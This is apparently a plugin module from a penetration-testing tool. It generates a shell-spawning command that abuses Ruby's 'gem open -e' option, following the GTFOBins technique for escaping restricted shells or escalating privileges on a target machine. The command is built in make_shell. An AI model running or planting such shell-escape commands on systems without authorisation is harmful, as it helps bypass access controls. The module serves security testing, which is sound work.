from ogabog.cores import plugin, const


class Shell(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/gem/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = 0
        self.is_interactive = True

    def make_shell(self):
        # The Gem should be cross platform because it is a part of ruby interpreted language. But the command check is
        # only available for Linux only and i didn't test on Windows environment
        # In https://gtfobins.github.io/gtfobins/gem/, we have 4 different methods to execute PTY.
        # This is the first method.
        self.shell = f"gem open -e \"{self.args.shell} -c {self.args.shell}\" "
        # In official doc, default gem "rdoc" is selected. However, test result on my system showed error
        # 'rdoc' is a default gem and can't be opened. Show I added quick bash commands to get all gems are not
        # default on the system to execute
        self.shell += "$(gem list | grep -v default | head -1 | cut -d " " -f 1)"
